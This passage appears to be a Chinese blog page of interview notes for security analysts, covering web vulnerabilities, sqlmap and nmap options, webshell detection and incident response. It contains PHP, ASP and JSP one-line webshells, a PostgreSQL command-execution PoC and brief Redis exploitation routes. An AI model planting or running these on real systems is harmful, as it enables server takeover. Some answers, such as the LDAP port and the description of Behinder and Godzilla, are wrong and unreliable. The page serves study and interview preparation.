title=\"一句话木马\"></a>一句话木马</h3><figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&lt;?php @eval($_POST[1]);?&gt;    php</span><br><span class=\"line\">&lt;%eval request(&quot;chopper&quot;)%&gt;   asp</span><br><span class=\"line\"> &lt;%Process process = Runtime.getRuntime().exec(request.getParameter(&quot;cmd&quot;));%&gt;  jsp</span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n\n\n\n<h3 id=\"社工手段有哪些\"><a href=\"#社工手段有哪些\" class=\"headerlink\" title=\"社工手段有哪些\"></a>社工手段有哪些</h3><ul>\n<li>邮件钓鱼 </li>\n<li>伪装成熟人</li>\n</ul>\n<h3 id=\"fastjson\"><a href=\"#fastjson\" class=\"headerlink\" title=\"fastjson\"></a>fastjson</h3><h3 id=\"客服有映射到外网的服务器被打进来了，如何溯源\"><a href=\"#客服有映射到外网的服务器被打进来了，如何溯源\" class=\"headerlink\" title=\"客服有映射到外网的服务器被打进来了，如何溯源\"></a>客服有映射到外网的服务器被打进来了，如何溯源</h3><h3 id=\"常见的中间件漏洞\"><a href=\"#常见的中间件漏洞\" class=\"headerlink\" title=\"常见的中间件漏洞\"></a>常见的中间件漏洞</h3><p>IIS</p>\n<ul>\n<li>解析漏洞</li>\n<li>put任意文件写入</li>\n<li>段文件漏洞</li>\n</ul>\n<p>apache</p>\n<ul>\n<li>未知扩展名解析漏洞</li>\n<li>addhandler导致的解析漏洞</li>\n<li>换行解析漏洞</li>\n</ul>\n<p>nginx</p>\n<ul>\n<li>解析漏洞</li>\n<li>空字节任意代码执行</li>\n<li>文件名逻辑漏洞‘</li>\n<li>配置错误导致的安全问题</li>\n</ul>\n<p>tomcat</p>\n<ul>\n<li>任意文件写入</li>\n<li>远程代码执行</li>\n<li>弱口令+后台getshell</li>\n</ul>\n<p>jboss</p>\n<ul>\n<li>反序列化漏洞</li>\n<li>弱口令</li>\n</ul>\n<h3 id=\"ngsoc冷热数据\"><a href=\"#ngsoc冷热数据\" class=\"headerlink\" title=\"ngsoc冷热数据\"></a>ngsoc冷热数据</h3><p>奇安信网神态势感知与安全运营平台（简称NGSOC）</p>\n<h3 id=\"代理工具类告警，流量特征\"><a href=\"#代理工具类告警，流量特征\" class=\"headerlink\" title=\"代理工具类告警，流量特征\"></a>代理工具类告警，流量特征</h3><h3 id=\"你感觉windows漏洞多还是linux漏洞多\"><a href=\"#你感觉windows漏洞多还是linux漏洞多\" class=\"headerlink\" title=\"你感觉windows漏洞多还是linux漏洞多\"></a>你感觉windows漏洞多还是linux漏洞多</h3><p>个人觉得linux漏洞多，debian linux漏洞最多</p>\n<h3 id=\"永恒之蓝\"><a href=\"#永恒之蓝\" class=\"headerlink\" title=\"永恒之蓝\"></a>永恒之蓝</h3><p>2017年</p>\n<p>用Windows系统的SMB协议漏洞来获取系统的最高权限 139，445端口</p>\n<h3 id=\"sql注入写文件\"><a href=\"#sql注入写文件\" class=\"headerlink\" title=\"sql注入写文件\"></a>sql注入写文件</h3><p>load_file()读文件 into outfile &#x2F; into dumpfile写文件</p>\n<h3 id=\"正向代理反向代理\"><a href=\"#正向代理反向代理\" class=\"headerlink\" title=\"正向代理反向代理\"></a>正向代理反向代理</h3><p>正向代理代理的对象是客户端，反向代理代理的对象是服务端。</p>\n<h3 id=\"延时注入在流量告警上如何判断的\"><a href=\"#延时注入在流量告警上如何判断的\" class=\"headerlink\" title=\"延时注入在流量告警上如何判断的\"></a>延时注入在流量告警上如何判断的</h3><h3 id=\"宽字节\"><a href=\"#宽字节\" class=\"headerlink\" title=\"宽字节\"></a>宽字节</h3><p>一个字符数大小为两个字节的为宽字节，比如GBK编码，我们汉字通常使用的就是GBK编码，也就是说一次性会读取两个字节。</p>\n<p>当我们的mysql使用GBK编码后，同时两个字符的前一个字符ASCII码大于128时，会将两个字符认成一个汉字</p>\n<h3 id=\"流量代理工具有哪些\"><a href=\"#流量代理工具有哪些\" class=\"headerlink\" title=\"流量代理工具有哪些\"></a>流量代理工具有哪些</h3><p>vpn，Shadowsocks，Trojan，WireGuard</p>\n<h3 id=\"冰蝎与哥斯拉的连接特征\"><a href=\"#冰蝎与哥斯拉的连接特征\" class=\"headerlink\" title=\"冰蝎与哥斯拉的连接特征\"></a>冰蝎与哥斯拉的连接特征</h3><p>冰蝎和哥斯拉都是利用远程管理工具（如Apache Struts漏洞）进行攻击，然后利用远程桌面协议（RDP）或SSH进行横向移动。</p>\n<p>都能够进行远程控制</p>\n<p>都可以进行数据窃取</p>\n<p>使用加密通信</p>\n<h3 id=\"怎么判断逻辑漏洞是否攻击成功\"><a href=\"#怎么判断逻辑漏洞是否攻击成功\" class=\"headerlink\" title=\"怎么判断逻辑漏洞是否攻击成功\"></a>怎么判断逻辑漏洞是否攻击成功</h3><ol>\n<li>行为变化：逻辑漏洞攻击成功后，攻击者可能会进行一些行为变化，比如访问一些不应该被访问的资源，或者执行一些不应该被执行的操作。</li>\n<li>数据变化：逻辑漏洞攻击成功后，攻击者可能会修改、删除或者新增某些数据。</li>\n<li>系统响应：逻辑漏洞攻击成功后，系统可能会出现异常响应，比如返回异常的HTTP状态码或者错误信息。</li>\n<li>安全日志：逻辑漏洞攻击成功后，可能会在系统的安全日志中留下痕迹，比如异常访问记录、错误日志等。</li>\n</ol>\n<h3 id=\"sql注入修复方式\"><a href=\"#sql注入修复方式\" class=\"headerlink\" title=\"sql注入修复方式\"></a>sql注入修复方式</h3><ul>\n<li>SQL语句预编译</li>\n<li>针对SQL输入内容进行限制、过滤 &#x2F;&#x2F;目前使用WAF对这一块进行处理</li>\n<li>针对提交的关键数据进行转义 ，比如\\select</li>\n<li>关闭错误信息输出 ，因为有些错误返回信息，会返回物理路径、数据库版本信息等</li>\n<li>数据库权限严格控制 ，不同级别的用户，只能进行相应级别权限的操作</li>\n<li>敏感信息严格加密处理</li>\n</ul>\n<h3 id=\"天眼与ngsoc区别\"><a href=\"#天眼与ngsoc区别\" class=\"headerlink\" title=\"天眼与ngsoc区别\"></a>天眼与ngsoc区别</h3><p>NGSOC主要应用于较为复杂、高风险的网络环境，如金融机构、能源公司等，其主要优点是可以集成多种不同的安全监测工具，实现信息的智能化分析和响应；而天眼则更加注重对企业内部网络资产的保护，具备网络漏洞检测和入侵攻击检测等多种功能。</p>\n<h3 id=\"文件上传漏洞如何防御\"><a href=\"#文件上传漏洞如何防御\" class=\"headerlink\" title=\"文件上传漏洞如何防御\"></a>文件上传漏洞如何防御</h3><ul>\n<li><p>检查文件上传路径 ( 避免 0x00 截断、 IIS6.0 文件夹解析漏洞、目录遍历 )</p>\n</li>\n<li><p>文件扩展名检测 ( 避免服务器以非图片的文件格式解析文件 ),验证文件扩展名 通常有两种方式 : 黑名单和白名单 .</p>\n</li>\n<li><p>文件 MIME验证 ( 比如 GIF 图片 MIME为 image&#x2F;gif,CSS 文件的 MIME为 text&#x2F;css 等 ) 3. 文件内容检测 ( 避免图片中插入 webshell)</p>\n</li>\n<li><p>图片二次渲染 ( 最变态的上传漏洞防御方式 , 基本上完全避免了文件上传漏洞 )</p>\n</li>\n<li><p>文件重命名 ( 如随机字符串或时间戳等方式 , 防止攻击者得到 webshell 的路径 )</p>\n</li>\n<li><p>隐藏上传路径</p>\n</li>\n</ul>\n<h3 id=\"xff\"><a href=\"#xff\" class=\"headerlink\" title=\"xff\"></a>xff</h3><p>x-forwarded-for 表了HTTP的请求端真实的IP</p>\n<p>可以进行sql注入</p>\n<h3 id=\"sql注入写文件前提\"><a href=\"#sql注入写文件前提\" class=\"headerlink\" title=\"sql注入写文件前提\"></a>sql注入写文件前提</h3><ul>\n<li>对web目录具有读写权限</li>\n<li>知道文件绝对路径</li>\n<li>能够使用联合查询（sql注入时）</li>\n<li>secure_file_priv，File_priv</li>\n</ul>\n<h3 id=\"sqlmap一些参数\"><a href=\"#sqlmap一些参数\" class=\"headerlink\" title=\"sqlmap一些参数\"></a>sqlmap一些参数</h3><figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">-h                  输出参数说明</span><br><span class=\"line\">-hh                 输出详细的参数说明</span><br><span class=\"line\">-v                  输出级别（0~6，默认1）</span><br><span class=\"line\">-u url              指定url</span><br><span class=\"line\">--data=DATA         该参数指定的数据会被作为POST数据提交</span><br><span class=\"line\">-r file.txt         常用于POST注入或表单提交时注入</span><br><span class=\"line\">-p / --skip         指定/跳过测试参数</span><br><span class=\"line\">--cookie            设置cookie</span><br><span class=\"line\">--force-ssl         强制使用SSL</span><br><span class=\"line\">--threads           指定线程并发数</span><br><span class=\"line\">--prefix            指定前缀</span><br><span class=\"line\">--suffix            指定后缀</span><br><span class=\"line\">--level             检测级别（1~5，默认1）</span><br><span class=\"line\">--risk              风险等级（1~4，默认1）</span><br><span class=\"line\">--all               列举所有可访问的数据（不推荐）</span><br><span class=\"line\">--banner            列举数据库系统的信息等</span><br><span class=\"line\">--current-user      输出当前用户</span><br><span class=\"line\">--current-db        输出当前所在数据库</span><br><span class=\"line\">--hostname          输出服务器主机名</span><br><span class=\"line\">--is-dba            检测当前用户是否为管理员</span><br><span class=\"line\">--users             输出数据库系统的所有用户</span><br><span class=\"line\">--dbs               输出数据库系统的所有数据库</span><br><span class=\"line\">-D DB               指定数据库</span><br><span class=\"line\">--tables            在-D情况下输出库中所有表名</span><br><span class=\"line\">-T table            在-D情况下指定数据表</span><br><span class=\"line\">--columns           在-D -T情况下输出表中所有列名</span><br><span class=\"line\">-C column           在-D -T情况下输出某列数据的值</span><br><span class=\"line\">--dump              拉取数据存放到本地</span><br><span class=\"line\">--dump-all          拉取所有可访问数据存放到本地</span><br><span class=\"line\">--count             输出数据条目数量</span><br><span class=\"line\">--search            搜索数据库名、表明、列名，需要与-D -T或-C 联用</span><br><span class=\"line\">--sql-query         执行任意的SQL语句</span><br><span class=\"line\">--sql-shell         使用交互式SQL语句执行环境</span><br><span class=\"line\">--flie-read         读取文件</span><br><span class=\"line\">--file-write        上传文件（指定本地路径）</span><br><span class=\"line\">--file-dest         上传文件（指定目标机器路径）</span><br><span class=\"line\">--os-cmd            执行任意系统命令</span><br><span class=\"line\">--os-shell          使用交互式shell执行命令</span><br><span class=\"line\">--batch             所有要求输入都选取默认值</span><br><span class=\"line\">--wizard            初学者向导</span><br></pre></td></tr></table></figure>\n\n\n\n\n\n<h3 id=\"csrf\"><a href=\"#csrf\" class=\"headerlink\" title=\"csrf\"></a>csrf</h3><p>攻击者可以盗用你的登陆信息，以你的身份模拟发送各种请求对服务器来说这个请求是完全合法的，但是却完成了攻击者所期望的一个操作</p>\n<p>CSRF 攻击的三个条件 :</p>\n<pre><code>   1 . 用户已经登录了站点 A，并在本地记录了 cookie\n\n   2 . 在用户没有登出站点 A 的情况下（也就是 cookie 生效的情况下），访问了恶意攻击者提供的引诱危险站点 B (B 站点要求访问站点A)。\n\n   3 . 站点 A 没有做任何 CSRF 防御\n</code></pre>\n<p><strong>漏洞检测</strong></p>\n<p>检测CSRF漏洞最简单的方法就是抓取一个正常请求的数据包，去掉Referer字段后再重新提交，如果该提交还有效，那么基本上可以确定存在CSRF漏洞。</p>\n<p><strong>防御</strong></p>\n<ol>\n<li>验证 HTTP Referer 字段；</li>\n<li>在请求地址中添加 token 并验证；</li>\n<li>在 HTTP 头中自定义属性并验证；</li>\n<li>Chrome 浏览器端启用 SameSite cookie</li>\n</ol>\n<h3 id=\"ssrf\"><a href=\"#ssrf\" class=\"headerlink\" title=\"ssrf\"></a>ssrf</h3><p>服务端请求伪造(Server-Side Request Forgery),指的是攻击者在未能取得服务器所有权限时，利用服务器漏洞以服务器的身份发送一条构造好的请求给服务器所在内网。SSRF攻击通常针对外部网络无法直接访问的内部系统。</p>\n<p>防御</p>\n<p>1、过滤返回的信息，如果web应用是去获取某一种类型的文件。那么在把返回结果展示给用户之前先验证返回的信息是否符合标准。</p>\n<p>2、统一错误信息，避免用户可以根据错误信息来判断远程服务器的端口状态。</p>\n<p>3、限制请求的端口，比如80,443,8080,8090。</p>\n<p>4、禁止不常用的协议，仅仅允许http和https请求。可以防止类似于file:&#x2F;&#x2F;&#x2F;,gopher:&#x2F;&#x2F;,ftp:&#x2F;&#x2F;等引起的问题。</p>\n<p>5、使用DNS缓存或者Host白名单的方式。</p>\n<h3 id=\"水坑漏洞\"><a href=\"#水坑漏洞\" class=\"headerlink\" title=\"水坑漏洞\"></a>水坑漏洞</h3><p>水坑攻击（Watering Hole Attack）”是一种网络攻击方式。攻击者通过在特定网页中植入恶意代码，来攻击访问该网页的用户</p>\n<p>防御</p>\n<p>（1）    及时更新操作系统及应用程序，修复已知漏洞；</p>\n<p>（2）    安装可以信赖的安全软件，及时发现网页浏览过程中的异常行为；</p>\n<p>（3）    监测所有网络传输流量，及时发现异常通信；</p>\n<h3 id=\"鱼叉攻击\"><a href=\"#鱼叉攻击\" class=\"headerlink\" title=\"鱼叉攻击\"></a>鱼叉攻击</h3><p>鱼叉攻击，肯定是有看到了鱼再叉，也就是有针对性的攻击，目标明确，比如公司或团体，给这些特定团体发送包含木马的邮件，这种邮件要让受害者打开，就需要一个欺骗和迷惑的标题。这个题目和内容的构造就考验红方的想象力了。比如打补丁的通知邮件，放假通知安排，投诉举报，简历投递或者来点公司的劲爆信息引爆吃瓜群众。员工点了附件之后，就中了木马，黑客在远端就可以远程控制这个电脑了。</p>\n<h3 id=\"tomcat可以执行的后缀名\"><a href=\"#tomcat可以执行的后缀名\" class=\"headerlink\" title=\"tomcat可以执行的后缀名\"></a>tomcat可以执行的后缀名</h3><p>jsp html htm js css xml gif jpg png pdf doc xls</p>\n<h3 id=\"ssrf有哪些协议\"><a href=\"#ssrf有哪些协议\" class=\"headerlink\" title=\"ssrf有哪些协议\"></a>ssrf有哪些协议</h3><p>http https ftp smtp dns file </p>\n<h3 id=\"mysql数据库系统执行函数\"><a href=\"#mysql数据库系统执行函数\" class=\"headerlink\" title=\"mysql数据库系统执行函数\"></a>mysql数据库系统执行函数</h3><h3 id=\"nmap参数\"><a href=\"#nmap参数\" class=\"headerlink\" title=\"nmap参数\"></a>nmap参数</h3><ul>\n<li>-sS 半开扫描(TCP SYN扫描)，执行速度快，不容易被注意到，可以避免被记入目标系统的日志，需要root权限。它常常被称为半开放扫描， 因为它不打开一个完全的TCP连接。它发送一个SYN报文， 就像您真的要打开一个连接，然后等待响应。</li>\n<li>-sT 当SYN扫描不能用时，TCP Connect()扫描就是默认的TCP扫描。会在⽬标主机的⽇志中记录⼤批连接请求和错误信息，但是由于是tcp connect()扫描，容易被记录。当SYN扫描可用时，它通常是更好的选择</li>\n<li>-sP ping扫描，Nmap在扫描端⼜时，默认都会使⽤ping扫描，只有主机存活，Nmap才会继续扫描。</li>\n<li>-sU UDP扫描，但UDP扫描是不可靠的，速度也比较慢</li>\n<li>-sA 这种扫描与目前为止讨论的其它扫描的不同之处在于 它不能确定open(开放的)或者 open|filtered(开放或者过滤的))端口。 它用于发现防火墙规则，确定它们是有状态的还是无状态的，哪些端口是被过滤的。</li>\n<li>-sV 探测端⼜服务版本</li>\n<li>-Pn 扫描之前不需要⽤ping命令，有些防⽕墙禁⽌ping命令。可以使⽤此选项进⾏扫描</li>\n<li>-v 显⽰扫描过程，推荐使⽤</li>\n<li>-p 指定端⼜，如“1-65535、1433、135、22、80”等</li>\n<li>-O 启⽤远程操作系统检测，存在误报</li>\n<li>-O –osscan-limit 针对指定的目标进行操作系统检测</li>\n<li>-O –osscan-guess 当Nmap无法确定所检测的操作系统时，会尽可能地提供最相近的匹配，Nmap默认 进行这种匹配</li>\n<li>-A 全⾯系统检测、启⽤脚本检测、扫描等</li>\n<li>-oN&#x2F;-oX&#x2F;-oG 将报告写⼊⽂件，分别是正常、XML、grepable 三种格式</li>\n<li>-iL 读取主机列表，例如，-iL “C:\\ip.txt”</li>\n</ul>\n<h3 id=\"天眼可以检测逻辑漏洞吗\"><a href=\"#天眼可以检测逻辑漏洞吗\" class=\"headerlink\" title=\"天眼可以检测逻辑漏洞吗\"></a>天眼可以检测逻辑漏洞吗</h3><p>天眼的漏洞扫描模块主要基于静态代码分析和黑盒测试技术，对于逻辑漏洞的检测能力相对有限。</p>\n<h3 id=\"内网渗透工具，代理\"><a href=\"#内网渗透工具，代理\" class=\"headerlink\" title=\"内网渗透工具，代理\"></a>内网渗透工具，代理</h3><h3 id=\"渗透测试流程\"><a href=\"#渗透测试流程\" class=\"headerlink\" title=\"渗透测试流程\"></a>渗透测试流程</h3><ul>\n<li>确定目标和范围：定义渗透测试的目标和范围，包括要测试的系统、应用程序、网络、物理设施等。</li>\n<li>收集情报：收集有关目标系统的信息，例如 IP 地址、操作系统类型、应用程序版本、网络拓扑等，以便进行后续测试。</li>\n<li>漏洞扫描：使用漏洞扫描工具对目标系统进行扫描，以发现已知的漏洞和弱点。</li>\n<li>渗透测试：通过手动测试和自动化工具进行渗透测试，包括尝试各种攻击向量，如 SQL 注入、XSS 攻击、文件包含漏洞、社交工程等。</li>\n<li>提交漏洞报告：将发现的漏洞和安全弱点整理成报告，详细描述漏洞的影响和风险，并提供建议和修复措施。</li>\n<li>清理痕迹：在测试完成后，清除所有测试过程中留下的痕迹，确保不会对目标系统造成任何影响或损害。</li>\n<li>重复测试：在修复漏洞后，进行重复测试以确认漏洞已被修复，并且没有引入新的漏洞。</li>\n</ul>\n<h3 id=\"天眼日志分析语法\"><a href=\"#天眼日志分析语法\" class=\"headerlink\" title=\"天眼日志分析语法\"></a>天眼日志分析语法</h3><p>天眼日志分析语法（TianEye Log Query Syntax）是指在奇安信的天眼平台上，用于查询、分析和可视化各种日志数据的语法。以下是一些常见的天眼日志分析语法示例：</p>\n<ol>\n<li>关键字查询：使用关键字查询指定时间段内的日志数据。例如，查询访问时间为2022年4月1日至4月30日之间的所有日志：</li>\n</ol>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">index=xxx sourcetype=yyy access_time&gt;=2022-04-01 access_time&lt;=2022-04-30</span><br></pre></td></tr></table></figure>\n\n<p>精确匹配查询：使用精确匹配查询指定某个字段的值。例如，查询客户端 IP 地址为 192.168.1.100 的所有日志：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">index=xxx sourcetype=yyy client_ip=192.168.1.100</span><br></pre></td></tr></table></figure>\n\n<p>多条件查询：使用多个条件查询组合查询结果。例如，查询客户端 IP 地址为 192.168.1.100，且访问时间为2022年4月1日至4月30日之间的所有日志：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">index=xxx sourcetype=yyy client_ip=192.168.1.100 access_time&gt;=2022-04-01 access_time&lt;=2022-04-30</span><br></pre></td></tr></table></figure>\n\n<p>聚合查询：使用聚合函数统计查询结果。例如，查询某个时间段内 HTTP 访问次数最多的前 10 个客户端 IP 地址：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">index=xxx sourcetype=yyy access_time&gt;=2022-04-01 access_time&lt;=2022-04-30 | top 10 client_ip</span><br></pre></td></tr></table></figure>\n\n<p>可视化查询：使用可视化组件将查询结果可视化。例如，使用柱状图可视化某个时间段内 HTTP 访问次数最多的前 10 个客户端 IP 地址：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">index=xxx sourcetype=yyy access_time&gt;=2022-04-01 access_time&lt;=2022-04-30 | </span><br></pre></td></tr></table></figure>\n\n<h3 id=\"天眼流量分析和威胁检测区别\"><a href=\"#天眼流量分析和威胁检测区别\" class=\"headerlink\" title=\"天眼流量分析和威胁检测区别\"></a>天眼流量分析和威胁检测区别</h3><p>天眼流量分析和威胁检测是奇安信的天眼平台提供的两个不同的功能模块，它们的主要区别如下：</p>\n<ol>\n<li>功能目标不同：天眼流量分析的主要目标是分析网络流量，了解网络拓扑结构、通信情况和性能状况，发现网络异常和瓶颈问题等；而威胁检测的主要目标是检测和预防网络威胁和攻击，包括漏洞扫描、入侵检测、恶意代码检测、网络流量分析等多个方面。</li>\n<li>数据来源不同：天眼流量分析主要关注网络流量数据，可以采集和分析网络设备、流量数据、协议、应用等方面的数据；而威胁检测则需要多种数据源的支持，如安全事件日志、主机安全数据、网络安全数据、终端安全数据等。</li>\n<li>数据处理方式不同：天眼流量分析主要采用流量抓包、协议解析、拓扑分析等技术进行数据处理和分析；而威胁检测则采用多种技术手段进行数据处理和分析，如恶意代码识别、行为分析、异常检测、漏洞扫描等。</li>\n<li>应用场景不同：天眼流量分析主要适用于网络运维、网络性能分析、网络安全监控等领域；而威胁检测则适用于网络安全、信息安全等领域，可以帮助企业发现和防范各种网络威胁和攻击。</li>\n</ol>\n<h3 id=\"天眼可以审0day吗\"><a href=\"#天眼可以审0day吗\" class=\"headerlink\" title=\"天眼可以审0day吗\"></a>天眼可以审0day吗</h3><p>不可以</p>\n<h3 id=\"怎么判断自己的机器是不是域控\"><a href=\"#怎么判断自己的机器是不是域控\" class=\"headerlink\" title=\"怎么判断自己的机器是不是域控\"></a>怎么判断自己的机器是不是域控</h3><ol>\n<li>打开计算机管理器：在 Windows 操作系统中，可以通过在开始菜单中搜索“计算机管理器”来打开计算机管理器。</li>\n<li>查看域：在计算机管理器中，展开“本地用户和组”或“计算机管理”等选项卡，然后选择“域”。如果机器加入了域并成为域控制器，将会在此处看到域的名称和其他域控制器的信息。</li>\n<li>检查服务：在 Windows 操作系统中，域控制器会运行一些特定的服务，比如“Active Directory域服务”，“DNS服务器服务”等。可以通过打开“服务”选项卡来查看这些服务是否在运行，并且是否是自动启动。</li>\n<li>检查系统信息：在 Windows 操作系统中，可以通过打开“系统信息”来查看机器的详细信息。在其中的“系统摘要”选项卡中，如果机器是域控制器，将会看到“角色”一栏显示“域控制器”。</li>\n</ol>\n<h3 id=\"常见webshell流量体征\"><a href=\"#常见webshell流量体征\" class=\"headerlink\" title=\"常见webshell流量体征\"></a>常见webshell流量体征</h3><ul>\n<li>异常流量：Webshell的流量通常会显示为异常流量，因为攻击者通常会通过Webshell上传和下载文件、执行命令等操作，这些操作都会产生大量不正常的流量。</li>\n<li>带有特定字符或字符串：Webshell可能会带有特定字符或字符串，如“eval(base64_decode(”，这些字符或字符串用于解码Webshell的命令或脚本，攻击者可能会使用这些字符或字符串来隐藏Webshell。</li>\n<li>频繁访问：Webshell的访问可能会比正常的用户访问频率更高，这是因为攻击者需要不断访问Webshell以获取控制目标服务器的权限。</li>\n<li>长时间运行的连接：Webshell的流量可能会包含长时间运行的连接，这是因为攻击者通常会保持Webshell的连接以便在需要时执行更多的操作。</li>\n<li>异常文件：Webshell可能会通过上传和下载文件来执行操作，因此出现异常文件或文件类型也可能是Webshell的流量体征。</li>\n</ul>\n<h3 id=\"常用数据库默认端口及漏洞\"><a href=\"#常用数据库默认端口及漏洞\" class=\"headerlink\" title=\"常用数据库默认端口及漏洞\"></a>常用数据库默认端口及漏洞</h3><ul>\n<li><p>89 端口（ldap）安全漏洞：未授权访问 、弱口令<br>利用方式：通过LdapBrowser工具直接连入。</p>\n</li>\n<li><p>1433 端口（Mssql）安全漏洞：弱口令、暴力破解<br>利用方式：差异备份getshell、SA账户提权等</p>\n</li>\n<li><p>1521 端口（Oracle）安全漏洞：弱口令、暴力破解<br>利用方式：通过弱口令&#x2F;暴力破解进行入侵。</p>\n</li>\n<li><p>3306 端口（MySQL）安全漏洞：弱口令、暴力破解<br>利用方式：利用日志写入webshell、udf提权、mof提权等。</p>\n</li>\n<li><p>5432 端口（ PostgreSQL）安全漏洞：弱口令、高权限命令执行<br>利用方式：攻击者通过弱口令获取账号信息，连入postgres中，可执行系统命令。PoC参考： DROP TABLE IF EXISTS cmd_exec; CREATE TABLE cmd_exec(cmd_output text); COPY cmd_exec FROM PROGRAM ‘id’; SELECT * FROM cmd_exec;</p>\n</li>\n<li><p>5984 端口（CouchDB）安全漏洞：垂直权限绕过、任意命令执行<br>利用方式：通过构造数据创建管理员用户，使用管理员用户登录，构造恶意请求触发任意命令执行。后台访问：http:&#x2F;&#x2F;:5984&#x2F;_utils</p>\n</li>\n<li><p>6379 端口（Redis）安全漏洞：未授权访问<br>利用方式：绝对路径写webshell 、利用计划任务执行命令反弹shell、公私钥认证获取root权限、主从复制RCE等。</p>\n</li>\n<li><p>9200 端口（elasticsearch）安全漏洞：未授权访问、命令执行</p>\n</li>\n</ul>\n<h3 id=\"目标ip是邮件服务器要怎么处理\"><a href=\"#目标ip是邮件服务器要怎么处理\" class=\"headerlink\" title=\"目标ip是邮件服务器要怎么处理\"></a>目标ip是邮件服务器要怎么处理</h3><ol>\n<li>检查邮件服务器是否正常运行：您可以通过尝试连接到邮件服务器并发送一封电子邮件来检查邮件服务器是否正常运行。如果邮件服务器无法连接或无法发送电子邮件，则可能需要检查邮件服务器的配置或网络设置。</li>\n<li>检查安全设置：邮件服务器需要设置安全措施以保护电子邮件和用户数据，如防火墙、反病毒软件和邮件过滤器等。您可以检查这些设置是否已启用或需要进行更新。</li>\n<li>更新邮件服务器软件：如果您的邮件服务器软件已经过时，可能需要更新到最新版本以修复可能存在的安全漏洞和错误。</li>\n<li>监控邮件服务器流量：监控邮件服务器的流量可以帮助您识别和防止未经授权的访问或攻击。您可以使用日志分析工具或流量监控工具来监控邮件服务器的流量，并检查是否存在异常活动。</li>\n<li>增强安全措施：除了基本的安全措施，您还可以考虑增强邮件服务器的安全措施，如强密码策略、多因素身份验证和加密等。这些措施可以帮助保护邮件服务器免受恶意</li>\n</ol>\n<h3 id=\"目的ip是114-114-114-114端口是53需要封禁吗\"><a href=\"#目的ip是114-114-114-114端口是53需要封禁吗\" class=\"headerlink\" title=\"目的ip是114.114.114.114端口是53需要封禁吗\"></a>目的ip是114.114.114.114端口是53需要封禁吗</h3><h3 id=\"群里面遇到exe可执行程序怎么处理\"><a href=\"#群里面遇到exe可执行程序怎么处理\" class=\"headerlink\" title=\"群里面遇到exe可执行程序怎么处理\"></a>群里面遇到exe可执行程序怎么处理</h3><ol>\n<li>不要下载或运行未知来源的可执行程序。如果你不确定该程序是否安全，请询问发送者或其他群组成员。</li>\n<li>使用杀毒软件进行扫描。如果你已经下载了该程序并想运行它，可以使用杀毒软件进行扫描，以确保它不包含任何恶意软件。</li>\n<li>隔离该文件。如果你怀疑该程序可能会造成破坏，请将其隔离在一个安全的位置，以防止其对你的计算机系统造成任何影响。</li>\n<li>通知管理员。如果你认为该程序可能会对其他群组成员造成威胁，请及时通知管理员或相关人员，并让他们采取适当的措施来处理该问题。</li>\n<li>虚拟机打开</li>\n</ol>\n<h3 id=\"遇到远控木马告警如何处理\"><a href=\"#遇到远控木马告警如何处理\" class=\"headerlink\" title=\"遇到远控木马告警如何处理\"></a>遇到远控木马告警如何处理</h3><ol>\n<li>立即断开网络连接。为了防止该木马进一步攻击计算机或服务器，你应该立即断开网络连接，包括断开无线网络和网线连接等。</li>\n<li>扫描计算机或服务器。使用安全软件对计算机或服务器进行全面扫描，以检测和清除远控木马。确保使用更新的杀毒软件，以提高检测和清除恶意软件的能力。</li>\n<li>更改密码。更改所有重要帐户的密码，例如电子邮件、在线银行、社交媒体等。确保密码是复杂且难以猜测的，建议使用密码管理器。</li>\n<li>及时备份数据。备份所有重要数据，包括文件、文档、照片等，以防止数据丢失。</li>\n<li>更新操作系统和软件。确保计算机或服务器上的操作系统和所有软件都是最新的，以填补可能的安全漏洞。</li>\n<li>通知安全管理员。如果你在工作环境中发现远控木马，应立即通知安全管理员或信息安全团队，并遵循公司的安全政策和流程。</li>\n</ol>\n<h3 id=\"cs\"><a href=\"#cs\" class=\"headerlink\" title=\"cs\"></a>cs</h3><p>一款渗透测试神器</p>\n<p><a class=\"link\"   href=\"https://blog.csdn.net/zzwwhhpp/article/details/111773395\" >https://blog.csdn.net/zzwwhhpp/article/details/111773395<i class=\"fas fa-external-link-alt\"></i></a></p>\n<h3 id=\"wireshark过滤条件\"><a href=\"#wireshark过滤条件\" class=\"headerlink\" title=\"wireshark过滤条件\"></a>wireshark过滤条件</h3><p>ip.src eq 192.168.1.107 or ip.dst eq 